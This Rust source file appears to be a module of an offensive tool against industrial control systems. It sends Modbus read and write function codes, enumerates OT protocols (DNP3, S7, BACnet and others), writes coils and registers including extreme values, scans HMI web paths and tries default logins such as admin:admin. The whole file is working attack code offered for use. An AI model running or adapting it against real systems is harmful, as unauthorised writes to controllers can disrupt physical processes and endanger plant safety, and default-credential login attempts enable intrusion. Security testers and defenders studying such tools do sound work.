use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn modbus(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Modbus TCP Exploitation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let operations = [
        (
            "Read coils (FC=01)",
            serde_json::json!({"action": "modbus", "fc": 1, "start": 0, "count": 100}),
        ),
        (
            "Read discrete inputs (FC=02)",
            serde_json::json!({"action": "modbus", "fc": 2, "start": 0, "count": 100}),
        ),
        (
            "Read holding regs (FC=03)",
            serde_json::json!({"action": "modbus", "fc": 3, "start": 0, "count": 100}),
        ),
        (
            "Read input regs (FC=04)",
            serde_json::json!({"action": "modbus", "fc": 4, "start": 0, "count": 100}),
        ),
        (
            "Write coil (FC=05)",
            serde_json::json!({"action": "modbus", "fc": 5, "addr": 0, "value": true}),
        ),
        (
            "Write register (FC=06)",
            serde_json::json!({"action": "modbus", "fc": 6, "addr": 0, "value": 1}),
        ),
        (
            "Write multiple coils (FC=0F)",
            serde_json::json!({"action": "modbus", "fc": 15, "start": 0, "values": [true, false, true]}),
        ),
        (
            "Write multiple regs (FC=10)",
            serde_json::json!({"action": "modbus", "fc": 16, "start": 0, "values": [1, 2, 3]}),
        ),
    ];

    for (name, body) in &operations {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let has_data = text.contains("value")
                    || text.contains("data")
                    || text.contains("register")
                    || text.contains("coil");
                let is_write = name.contains("Write");
                let tag = if has_data && is_write {
                    "WRITE OK".red().bold().to_string()
                } else if has_data {
                    "DATA READ".red().bold().to_string()
                } else if status == 200 {
                    "accepted".to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:35} {}", "*".cyan(), name, tag);
            }
            Err(_) => {
                println!("  {} {:35} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} Modbus has no authentication — any network access = full control.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn enum_ot(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OT Device Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let protocols = [
        (
            "Modbus TCP",
            502,
            serde_json::json!({"action": "enum", "protocol": "modbus"}),
        ),
        (
            "Ethernet/IP (CIP)",
            44818,
            serde_json::json!({"action": "enum", "protocol": "cip"}),
        ),
        (
            "DNP3",
            20000,
            serde_json::json!({"action": "enum", "protocol": "dnp3"}),
        ),
        (
            "S7 Comm",
            102,
            serde_json::json!({"action": "enum", "protocol": "s7"}),
        ),
        (
            "BACnet",
            47808,
            serde_json::json!({"action": "enum", "protocol": "bacnet"}),
        ),
        (
            "OPC UA",
            4840,
            serde_json::json!({"action": "enum", "protocol": "opcua"}),
        ),
        (
            "Profinet",
            34962,
            serde_json::json!({"action": "enum", "protocol": "profinet"}),
        ),
        (
            "IEC 61850",
            102,
            serde_json::json!({"action": "enum", "protocol": "iec61850"}),
        ),
    ];

    for (name, port, body) in &protocols {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let has_device = text.contains("device")
                    || text.contains("plc")
                    || text.contains("model")
                    || text.contains("vendor");
                let tag = if has_device {
                    "DEVICE FOUND".red().bold().to_string()
                } else if status == 200 {
                    "responding".to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} port={:6} {}", "*".cyan(), name, port, tag);
            }
            Err(_) => {
                println!("  {} {:25} port={:6} error", "*".red(), name, port);
            }
        }
    }

    println!(
        "\n{} OT devices often have no auth — CISA alerts increasing.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn write_test(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} OT Register/Coil Write Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let write_tests = [
        (
            "Coil 0 ON",
            serde_json::json!({"action": "modbus_write", "fc": 5, "addr": 0, "value": true}),
        ),
        (
            "Coil 0 OFF",
            serde_json::json!({"action": "modbus_write", "fc": 5, "addr": 0, "value": false}),
        ),
        (
            "Register 0 = 1",
            serde_json::json!({"action": "modbus_write", "fc": 6, "addr": 0, "value": 1}),
        ),
        (
            "Register 0 = 0",
            serde_json::json!({"action": "modbus_write", "fc": 6, "addr": 0, "value": 0}),
        ),
        (
            "Register 0 = MAX",
            serde_json::json!({"action": "modbus_write", "fc": 6, "addr": 0, "value": 65535}),
        ),
        (
            "Register 40001 = 1",
            serde_json::json!({"action": "modbus_write", "fc": 6, "addr": 40001, "value": 1}),
        ),
    ];

    for (name, body) in &write_tests {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let written = text.contains("success") || text.contains("written") || status == 200;
                let tag = if written {
                    "WRITE ACCEPTED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} WARNING: Write tests can affect physical processes. Use with caution.",
        "[!]".red().bold()
    );
    Ok(())
}

pub async fn hmi(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} HMI Web Interface Exposure Scanner", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let hmi_paths = [
        ("/", "Root page"),
        ("/login", "Login page"),
        ("/admin", "Admin panel"),
        ("/config", "Configuration"),
        ("/cgi-bin/", "CGI scripts"),
        ("/ws/", "WebSocket interface"),
        ("/api/", "API endpoint"),
        ("/portal/", "HMI portal"),
    ];

    for (path, desc) in &hmi_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let is_hmi = body.contains("HMI")
                    || body.contains("SCADA")
                    || body.contains("PLC")
                    || body.contains("Siemens")
                    || body.contains("Rockwell")
                    || body.contains("Schneider")
                    || body.contains("factory")
                    || body.contains("industrial");
                let tag = if is_hmi {
                    "HMI DETECTED".red().bold().to_string()
                } else if status == 200 {
                    "web page".to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:15} {:15} {}", "*".cyan(), path, desc, tag);
            }
            Err(_) => {
                println!("  {} {:15} error", "*".red(), path);
            }
        }
    }

    let default_creds = [
        ("admin", "admin"),
        ("admin", ""),
        ("user", "user"),
        ("operator", "operator"),
    ];
    println!(
        "\n  {} Testing default credentials on HMI login:",
        "[*]".cyan().bold()
    );
    for (user, pass) in &default_creds {
        let body = serde_json::json!({"action": "hmi_login", "host": url, "username": user, "password": pass});
        if let Ok(resp) = client.post(url).json(&body).send().await {
            let text = resp.text().await.unwrap_or_default();
            if text.contains("success") || text.contains("token") || text.contains("session") {
                println!(
                    "    {} {:15}:{:15} — {}",
                    "[+]".green().bold(),
                    user,
                    pass,
                    "LOGGED IN".red().bold()
                );
            }
        }
    }
    Ok(())
}
